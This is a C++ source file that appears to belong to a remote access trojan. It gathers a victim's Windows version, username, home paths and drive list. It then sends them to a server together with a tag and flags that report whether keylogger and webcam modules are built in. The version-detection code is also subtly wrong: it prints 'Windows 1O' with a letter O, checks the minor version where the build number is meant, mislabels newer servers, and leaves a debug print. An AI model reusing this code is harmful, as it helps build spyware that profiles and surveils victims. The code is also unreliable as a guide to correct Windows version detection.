#include "SystemInformation.h"


std::string SystemInformation::getWindowsVersion() {
    OSVERSIONINFOEX info;
    ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
    info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((LPOSVERSIONINFO) &info);

    std::string str = "Windows ";
    if (info.dwMajorVersion == 6) {
        if (info.dwMinorVersion == 0) {
            if (info.wProductType == VER_NT_WORKSTATION)
                str.append("Vista");
            else str.append("Server 2008");
        } else if (info.dwMinorVersion == 1) {
            if (info.wProductType == VER_NT_WORKSTATION)
                str.append("7");
            else str.append("Server 2008 R2");
        } else if (info.dwMinorVersion == 2) {
            if (info.wProductType == VER_NT_WORKSTATION)
                str.append("8");
            else str.append("Server 2012");
        } else if (info.dwMinorVersion == 3) {
            if (info.wProductType == VER_NT_WORKSTATION)
                str.append("8.1");
            else str.append("Server 2012 R2");
        }
    } else if (info.dwMajorVersion >= 10) {
        if (info.wProductType == VER_NT_WORKSTATION) {
            if (info.dwMinorVersion > 22000)
                str.append("11");
            else
                str.append("1O");
        } else str.append("Server 2012 R2");

    }
    std::cout << info.dwMinorVersion;
    return str;
}


std::vector<std::string> SystemInformation::getDisks() {
    DWORD dwSize = MAX_PATH;
    char szLogicalDrives[MAX_PATH] = {0};
    DWORD dwResult = GetLogicalDriveStrings(dwSize, szLogicalDrives);
    std::vector<std::string> diskVector;
    if (dwResult > 0 && dwResult <= MAX_PATH) {
        char *szSingleDrive = szLogicalDrives;
        while (*szSingleDrive) {
            diskVector.emplace_back(szSingleDrive);
            szSingleDrive += strlen(szSingleDrive) + 1;
        }
    }
    return diskVector;
}

std::string SystemInformation::getUsername() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    std::string str(username);
    return str;
}

std::string SystemInformation::vector2string(std::vector<std::string> vector) {
    std::ostringstream vts;
    std::copy(vector.begin(), vector.end() - 1,
              std::ostream_iterator<std::string>(vts, ", "));
    vts << vector.back();
    return vts.str();
}

// Creating vector with all information related to the system
std::vector<std::string> SystemInformation::getSystemInformation() {
    std::vector<std::string> informationVector;
    informationVector.push_back(getWindowsVersion());
    informationVector.emplace_back(getenv("USERPROFILE"));
    informationVector.emplace_back(getenv("HOMEPATH"));
    informationVector.emplace_back(getenv("HOMEDRIVE"));
    informationVector.push_back(getUsername());
    informationVector.push_back(vector2string(getDisks()));
    informationVector.emplace_back(TAG_NAME);
    // Add or not modules to server
#ifdef WEBCAM
    informationVector.emplace_back("true");
#else
    informationVector.emplace_back("false");
#endif
#ifdef KEYLOGGER
    informationVector.emplace_back("true");
#else
    informationVector.emplace_back("false");
#endif
    return informationVector;
}

void SystemInformation::sendDisks(){
    stream.sendList(getDisks());
}

void SystemInformation::send() {
    stream.sendList(getSystemInformation());
}

SystemInformation::SystemInformation(const Stream &stream) : Sender(stream) {}
